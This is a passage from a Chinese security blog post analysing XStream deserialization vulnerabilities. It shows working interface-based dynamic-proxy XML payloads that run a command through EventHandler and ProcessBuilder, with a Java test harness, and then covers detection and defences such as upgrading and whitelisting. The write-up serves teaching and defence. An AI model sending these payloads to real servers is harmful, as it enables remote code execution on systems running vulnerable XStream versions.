+<h4 id="基于接口的PoC"><a href="#基于接口的PoC" class="headerlink" title="基于接口的PoC"></a>基于接口的PoC</h4><h5 id="适用范围-2"><a href="#适用范围-2" class="headerlink" title="适用范围"></a>适用范围</h5><p>通杀1.4.x系列有漏洞的版本，即&lt;=1.4.6或=1.4.10。但是缺点是，我们必须得知道服务端反序列化得到的是啥接口类。</p>
+<h5 id="接口特征"><a href="#接口特征" class="headerlink" title="接口特征"></a>接口特征</h5><p>一般的，基于接口类型的payload，是需要按照接口形式来编写的，即interface标签内容指向接口类。比如<a href="http://x-stream.github.io/CVE-2013-7285.html" target="_blank" rel="noopener">官网</a>给的例子，其中Contact是个接口类：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">contact</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">interface</span>&gt;</span>org.company.model.Contact<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">'java.beans.EventHandler'</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">'java.lang.ProcessBuilder'</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc.exe<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">handler</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">contact</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">XStream xstream = <span class="keyword">new</span> XStream();</span><br><span class="line">Contact contact = (Contact)xstream.fromXML(xml);</span><br></pre></td></tr></table></figure>
+<p>这种方式是基于服务端解析XML之后会直接调用到XML中interface标签指向的接口类声明的方法，因此这种情形下必然会触发动态代理类对象的恶意方法。</p>
+<h5 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h5><p>下面我们试下这个payload，ipayload.xml，这个更为简单直接，不需要在dynamic-proxy外再加其他的转换器，直接利用的DynamicProxyConverter转换器来识别：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">interface</span>&gt;</span>IPerson<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">"java.beans.EventHandler"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc.exe<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>修改Test.java，将Person类改为IPerson接口类，和ipayload.xml中的interface标签内容相对应：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException </span>&#123;</span><br><span class="line"><span class="comment">//        String xml = new Scanner(new File("ipayload.xml")).useDelimiter("\\Z").next();</span></span><br><span class="line">        FileInputStream xml = <span class="keyword">new</span> FileInputStream(<span class="string">"ipayload.xml"</span>);</span><br><span class="line">        XStream xstream = <span class="keyword">new</span> XStream(<span class="keyword">new</span> DomDriver());</span><br><span class="line">        IPerson p = (IPerson) xstream.fromXML(xml);</span><br><span class="line">        p.output();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>还有一点需要注意的是，IPerson接口类必须定义成public即公有的，否则程序运行会报错显示没有权限访问该接口类。</p>
+<p>成功触发：</p>
+<p><img src="/2019/10/21/XStream反序列化漏洞/1.png" alt=""></p>
+<h5 id="无法通杀-lt-1-3-1版本的原因-2"><a href="#无法通杀-lt-1-3-1版本的原因-2" class="headerlink" title="无法通杀&lt;=1.3.1版本的原因"></a>无法通杀&lt;=1.3.1版本的原因</h5><p>尝试攻击会报以下错误，说是不能创建EventHandler类对象、因为其没有无参构造函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; com.thoughtworks.xstream.converters.ConversionException: Cannot construct java.beans.EventHandler as it does not have a no-args constructor : Cannot construct java.beans.EventHandler as it does not have a no-args constructor</span><br><span class="line">---- Debugging information ----</span><br><span class="line">message             : Cannot construct java.beans.EventHandler as it does not have a no-args constructor</span><br><span class="line">cause-exception     : com.thoughtworks.xstream.converters.reflection.ObjectAccessException</span><br><span class="line">cause-message       : Cannot construct java.beans.EventHandler as it does not have a no-args constructor</span><br><span class="line">class               : com.thoughtworks.xstream.mapper.DynamicProxyMapper$DynamicProxy</span><br><span class="line">required-type       : java.beans.EventHandler</span><br><span class="line">path                : /dynamic-proxy/handler</span><br><span class="line">-------------------------------</span><br></pre></td></tr></table></figure>
+<h5 id="无法通杀1-4-7-1-4-9版本的原因-2"><a href="#无法通杀1-4-7-1-4-9版本的原因-2" class="headerlink" title="无法通杀1.4.7-1.4.9版本的原因"></a>无法通杀1.4.7-1.4.9版本的原因</h5><p>和前面基于sorted-set的PoC的原因是一样的。</p>
+<h2 id="0x03-检测与防御"><a href="#0x03-检测与防御" class="headerlink" title="0x03 检测与防御"></a>0x03 检测与防御</h2><h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><ol>
+<li>查看目标环境中是否有存在漏洞版本的XStream的jar包，即1.4.x系列版本中&lt;=1.4.6或=1.4.10；</li>
+<li>全局搜索是否存在<code>Xstream.fromXML(</code>的地方，若存在则进一步分析该参数是否外部可控；若为1.4.10版本的还需要确认是否开启了安全配置进行了有效的防御；</li>
+</ol>
+<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><ol>
+<li><p>将XStream升级到最新版，即1.4.11之后的版本；</p>
+</li>
+<li><p>若只想手动修改代码，可以参考1.4.7-1.4.9版本的修补方法，在ReflectionConverter.canConvert()函数中添加了对包括EventHandler等类的过滤，当然这只是黑名单过滤方式，存在绕过风险：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canConvert</span><span class="params">(Class type)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">this</span>.type != <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.type == type) || (<span class="keyword">this</span>.type == <span class="keyword">null</span> &amp;&amp; type != <span class="keyword">null</span> &amp;&amp; type != eventHandlerType))</span><br><span class="line">    &amp;&amp; canAccess(type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>若版本号&gt;=1.4.7，XStream提供了一个安全框架供用户使用，但必须手工设置，可以调用addPermission()、allowTypes()、denyTypes()等对某些类进行限制，即建立黑白名单机制进行过滤：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">XStream.addPermission（TypePermission）;</span><br><span class="line">XStream.allowTypes（Class []）;</span><br><span class="line">XStream.allowTypes（String []）;</span><br><span class="line">XStream.allowTypesByRegExp（String []）;</span><br><span class="line">XStream.allowTypesByRegExp（Pattern []）;</span><br><span class="line">XStream.allowTypesByWildcard（String []）;</span><br><span class="line">XStream.allowTypeHierary（Class）;</span><br><span class="line">XStream.denyPermission（TypePermission）;</span><br><span class="line">XStream.denyTypes（Class []）;</span><br><span class="line">XStream.denyTypes（String []）;</span><br><span class="line">XStream.denyTypesByRegExp（String []）;</span><br><span class="line">XStream.denyTypesByRegExp（Pattern []）;</span><br><span class="line">XStream.denyTypesByWildcard（String []）;</span><br><span class="line">XStream.denyTypeHierary（Class）;</span><br></pre></td></tr></table></figure>
+<p>具体的参考：<a href="http://x-stream.github.io/security.html" target="_blank" rel="noopener">http://x-stream.github.io/security.html</a></p>
+</li>
+<li><p>若是1.4.10版本，提供了XStream.setupDefaultSecurity()函数来设置XStream反序列化类型的默认白名单，其本质还是调用XStream提供的安全框架里的addPermission()、allowTypes()、denyTypes()等函数，区别在于自己定义了一些默认白名单，<strong>但必须手工设置，否则还是存在漏洞</strong>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setupDefaultSecurity</span><span class="params">(<span class="keyword">final</span> XStream xstream)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (xstream.insecureWarning) &#123;</span><br><span class="line">        xstream.addPermission(NoTypePermission.NONE);</span><br><span class="line">        xstream.addPermission(NullPermission.NULL);</span><br><span class="line">        xstream.addPermission(PrimitiveTypePermission.PRIMITIVES);</span><br><span class="line">        xstream.addPermission(ArrayTypePermission.ARRAYS);</span><br><span class="line">        xstream.addPermission(InterfaceTypePermission.INTERFACES);</span><br><span class="line">        xstream.allowTypeHierarchy(Calendar.class);</span><br><span class="line">        xstream.allowTypeHierarchy(Collection.class);</span><br><span class="line">        xstream.allowTypeHierarchy(Map.class);</span><br><span class="line">        xstream.allowTypeHierarchy(Map.Entry.class);</span><br><span class="line">        xstream.allowTypeHierarchy(Member.class);</span><br><span class="line">        xstream.allowTypeHierarchy(Number.class);</span><br><span class="line">        xstream.allowTypeHierarchy(Throwable.class);</span><br><span class="line">        xstream.allowTypeHierarchy(TimeZone.class);</span><br><span class="line"></span><br><span class="line">        Class type = JVM.loadClassForName(<span class="string">"java.lang.Enum"</span>);</span><br><span class="line">        <span class="keyword">if</span> (type != <span class="keyword">null</span>) &#123;</span><br><span class="line">            xstream.allowTypeHierarchy(type);</span><br><span class="line">        &#125;</span><br><span class="line">        type = JVM.loadClassForName(<span class="string">"java.nio.file.Path"</span>);</span><br><span class="line">        <span class="keyword">if</span> (type != <span class="keyword">null</span>) &#123;</span><br><span class="line">            xstream.allowTypeHierarchy(type);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Set types = <span class="keyword">new</span> HashSet();</span><br><span class="line">        types.add(BitSet.class);</span><br><span class="line">        types.add(Charset.class);</span><br><span class="line">        types.add(Class.class);</span><br><span class="line">        types.add(Currency.class);</span><br><span class="line">        types.add(Date.class);</span><br><span class="line">        types.add(DecimalFormatSymbols.class);</span><br><span class="line">        types.add(File.class);</span><br><span class="line">        types.add(Locale.class);</span><br><span class="line">        types.add(Object.class);</span><br><span class="line">        types.add(Pattern.class);</span><br><span class="line">        types.add(StackTraceElement.class);</span><br><span class="line">        types.add(String.class);</span><br><span class="line">        types.add(StringBuffer.class);</span><br><span class="line">        types.add(JVM.loadClassForName(<span class="string">"java.lang.StringBuilder"</span>));</span><br><span class="line">        types.add(URL.class);</span><br><span class="line">        types.add(URI.class);</span><br><span class="line">        types.add(JVM.loadClassForName(<span class="string">"java.util.UUID"</span>));</span><br><span class="line">        <span class="keyword">if</span> (JVM.isSQLAvailable()) &#123;</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.sql.Timestamp"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.sql.Time"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.sql.Date"</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (JVM.is18()) &#123;</span><br><span class="line">            xstream.allowTypeHierarchy(JVM.loadClassForName(<span class="string">"java.time.Clock"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.Duration"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.Instant"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.LocalDate"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.LocalDateTime"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.LocalTime"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.MonthDay"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.OffsetDateTime"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.OffsetTime"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.Period"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.Ser"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.Year"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.YearMonth"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.ZonedDateTime"</span>));</span><br><span class="line">            xstream.allowTypeHierarchy(JVM.loadClassForName(<span class="string">"java.time.ZoneId"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.chrono.HijrahDate"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.chrono.JapaneseDate"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.chrono.JapaneseEra"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.chrono.MinguoDate"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.chrono.ThaiBuddhistDate"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.chrono.Ser"</span>));</span><br><span class="line">            xstream.allowTypeHierarchy(JVM.loadClassForName(<span class="string">"java.time.chrono.Chronology"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.temporal.ValueRange"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.temporal.WeekFields"</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        types.remove(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Iterator iter = types.iterator();</span><br><span class="line">        <span class="keyword">final</span> Class[] classes = <span class="keyword">new</span> Class[types.size()];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; classes.length; ++i) &#123;</span><br><span class="line">            classes[i] = (Class)iter.next();</span><br><span class="line">        &#125;</span><br><span class="line">        xstream.allowTypes(classes);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Security framework of XStream instance already initialized"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>试下效果，在前面的Demo我们添加这个默认白名单过滤：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException </span>&#123;</span><br><span class="line">        FileInputStream xml = <span class="keyword">new</span> FileInputStream(<span class="string">"ipayload.xml"</span>);</span><br><span class="line">        XStream xstream = <span class="keyword">new</span> XStream(<span class="keyword">new</span> DomDriver());</span><br><span class="line">        <span class="comment">// 使用默认白名单过滤</span></span><br><span class="line">        XStream.setupDefaultSecurity(xstream);</span><br><span class="line">        Person p = (Person) xstream.fromXML(xml);</span><br><span class="line">        p.output();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行后会报错，显示禁止反序列化动态代理类，成功修补了漏洞：</p>
+<p><img src="/2019/10/21/XStream反序列化漏洞/30.png" alt=""></p>
+</li>
+</ol>
+<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="http://x-stream.github.io/" target="_blank" rel="noopener">XStream官网</a></p>
+<p><a href="http://www.pwntester.com/blog/2013/12/23/rce-via-xstream-object-deserialization38/" target="_blank" rel="noopener">RCE via XStream object deserialization</a></p>
+<p><a href="https://www.freebuf.com/column/209781.html" target="_blank" rel="noopener">XStream CVE-2019-10173漏洞分析</a></p>
+
+    </div>
+
+  </article>
+  <div class="toc-container">
+    
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-基本概念"><span class="toc-text">0x01 基本概念</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XStream简介"><span class="toc-text">XStream简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用XStream实现序列化与反序列化"><span class="toc-text">使用XStream实现序列化与反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java动态代理机制"><span class="toc-text">Java动态代理机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EventHandler类"><span class="toc-text">EventHandler类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Converter转换器"><span class="toc-text">Converter转换器</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-XStream反序列化漏洞"><span class="toc-text">0x02 XStream反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#影响范围"><span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基本原理"><span class="toc-text">基本原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#几种PoC浅析"><span class="toc-text">几种PoC浅析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#基于sorted-set的PoC"><span class="toc-text">基于sorted-set的PoC</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#适用范围"><span class="toc-text">适用范围</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#复现"><span class="toc-text">复现</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#调试分析"><span class="toc-text">调试分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#小结"><span class="toc-text">小结</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#无法通杀-lt-1-3-1版本的原因"><span class="toc-text">无法通杀&lt;=1.3.1版本的原因</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#无法通杀1-4-1-4-5版本的原因"><span class="toc-text">无法通杀1.4-1.4.5版本的原因</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#无法通杀1-4-7-1-4-9版本的原因"><span class="toc-text">无法通杀1.4.7-1.4.9版本的原因</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#为何1-4-10能够成功"><span class="toc-text">为何1.4.10能够成功</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#看看1-4-11如何修补的"><span class="toc-text">看看1.4.11如何修补的</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#基于tree-map的PoC"><span class="toc-text">基于tree-map的PoC</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#适用范围-1"><span class="toc-text">适用范围</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#复现-1"><span class="toc-text">复现</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#为何能通杀1-4-1-4-5版本"><span class="toc-text">为何能通杀1.4-1.4.5版本</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#无法通杀-lt-1-3-1版本的原因-1"><span class="toc-text">无法通杀&lt;=1.3.1版本的原因</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#无法通杀1-4-7-1-4-9版本的原因-1"><span class="toc-text">无法通杀1.4.7-1.4.9版本的原因</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#基于接口的PoC"><span class="toc-text">基于接口的PoC</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#适用范围-2"><span class="toc-text">适用范围</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#接口特征"><span class="toc-text">接口特征</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#复现-2"><span class="toc-text">复现</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#无法通杀-lt-1-3-1版本的原因-2"><span class="toc-text">无法通杀&lt;=1.3.1版本的原因</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#无法通杀1-4-7-1-4-9版本的原因-2"><span class="toc-text">无法通杀1.4.7-1.4.9版本的原因</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-检测与防御"><span class="toc-text">0x03 检测与防御</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#检测方法"><span class="toc-text">检测方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#防御方法"><span class="toc-text">防御方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-参考"><span class="toc-text">0x04 参考</span></a></li></ol>
+  </div>
+
+
+  </div>
+</div>
+<div class="copyright">
+    <span>本作品采用</span>
+    <a href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
+    <span>进行许可。 转载时请注明原文链接。</span>
+</div>
+
+<div class="share" style="width: 100%;">
+  <img src="" alt="" style="margin: auto; display: block;"/>
+
+  <div style="margin: auto; text-align: center; font-size: 0.8em; color: grey;">test</div>
+  
+</div>
+
+
+  
+    <div class="post-nav">
+      <div class="post-nav-item post-nav-next">
+        
+          <span>〈 </span>
+          <a href="/2019/10/20/浅析JavaScript原型链污染攻击/" rel="next" title="浅析JavaScript原型链污染攻击">
+          浅析JavaScript原型链污染攻击
+          </a>
+        
+      </div>
+  
+      <div class="post-nav-item post-nav-prev">
+          
+      </div>
+    </div>
+  
+
+
+    </div>
+
+    
+
+  </div>
+  <footer class="footer text-center">
+    <div id="bottom-inner">
+        <span>Copyright &copy; Mi1k7ea</span>  |  
+        <span id="busuanzi_container_site_uv">本站总访问量 <span id="busuanzi_value_site_uv"></span> 次</span>
+    </div>
+</footer>
+
+  
+
+<script>
+  (function(window, document, undefined) {
+
+    var timer = null;
+
+    function returnTop() {
+      cancelAnimationFrame(timer);
+      timer = requestAnimationFrame(function fn() {
+        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
+        if (oTop > 0) {
+          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
+          timer = requestAnimationFrame(fn);
+        } else {
+          cancelAnimationFrame(timer);
+        }
+      });
+    }
+
+    var hearts = [];
+    window.requestAnimationFrame = (function() {
+      return window.requestAnimationFrame ||
+        window.webkitRequestAnimationFrame ||
+        window.mozRequestAnimationFrame ||
+        window.oRequestAnimationFrame ||
+        window.msRequestAnimationFrame ||
+        function(callback) {
+          setTimeout(callback, 1000 / 60);
+        }
+    })();
+    init();
+
+    function init() {
+      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
+      attachEvent();
+      gameloop();
+      addMenuEvent();
+    }
+
+    function gameloop() {
+      for (var i = 0; i < hearts.length; i++) {
+        if (hearts[i].alpha <= 0) {
+          document.body.removeChild(hearts[i].el);
+          hearts.splice(i, 1);
+          continue;
+        }
+        hearts[i].y--;
+        hearts[i].scale += 0.004;
+        hearts[i].alpha -= 0.013;
+        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
+      }
+      requestAnimationFrame(gameloop);
+    }
+
+    /**
+     * 给logo设置点击事件
+     * 
+     * - 回到顶部
+     * - 出现爱心
+     */
+    function attachEvent() {
+      var old = typeof window.onclick === "function" && window.onclick;
+      var logo = document.getElementById("logo");
+      if (logo) {
+        logo.onclick = function(event) {
+          returnTop();
+          old && old();
+          createHeart(event);
+        }
+      }
+      
+    }
+
+    function createHeart(event) {
+      var d = document.createElement("div");
+      d.className = "heart";
+      hearts.push({
+        el: d,
+        x: event.clientX - 5,
+        y: event.clientY - 5,
+        scale: 1,
+        alpha: 1,
+        color: randomColor()
+      });
+      document.body.appendChild(d);
+    }
+
+    function css(css) {
+      var style = document.createElement("style");
+      style.type = "text/css";
+      try {
+        style.appendChild(document.createTextNode(css));
+      } catch (ex) {
